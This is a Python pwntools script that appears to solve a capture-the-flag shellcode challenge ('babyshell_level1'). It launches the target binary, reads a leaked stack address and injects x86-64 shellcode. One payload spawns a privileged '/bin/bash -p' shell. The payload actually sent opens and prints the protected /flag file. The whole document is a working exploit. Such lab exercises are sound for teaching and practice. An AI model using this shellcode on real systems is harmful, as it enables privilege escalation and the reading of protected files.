from pwn import *
import glob
import pwnlib

DEBUG = len(sys.argv) > 1 and sys.argv[1] == 'debug'

bin_path = '/challenge/babyshell_level1'
context.arch = 'amd64'

if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    p = gdb.debug([bin_path])
else:
    p = process([bin_path])

print(p.recvuntil(b'[LEAK] Placing shellcode on the stack at ').decode())

addr = p.recvline().decode().rstrip('!\n')


# Shell
shellcode = f'''
push 0x{b'h'.hex()}
mov rax, 0x{b'/bin/bas'[::-1].hex()}
push rax
mov rdi, rsp
push 0x{b'-p'[::-1].hex()}
mov rsi, rsp
push 0
push rsi
push rdi
mov rsi, rsp
mov rdx, 0  # NULL
mov rax, SYS_execve
syscall
'''

# For read
shellcode = f'''
mov rax, 0x{b'/flag'[::-1].hex()}
push rax
mov rdi, rsp  # /flag
mov rsi, 0  # O_RDONLY
mov rax, SYS_open
syscall  # open("/flag", O_RDONLY)

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 1000
mov rax, SYS_sendfile
syscall  # sendfile(1, fd, 0, 1000)

mov rax, SYS_exit
syscall  # exit()
'''

p.send(asm(shellcode))
print(p.interactive())
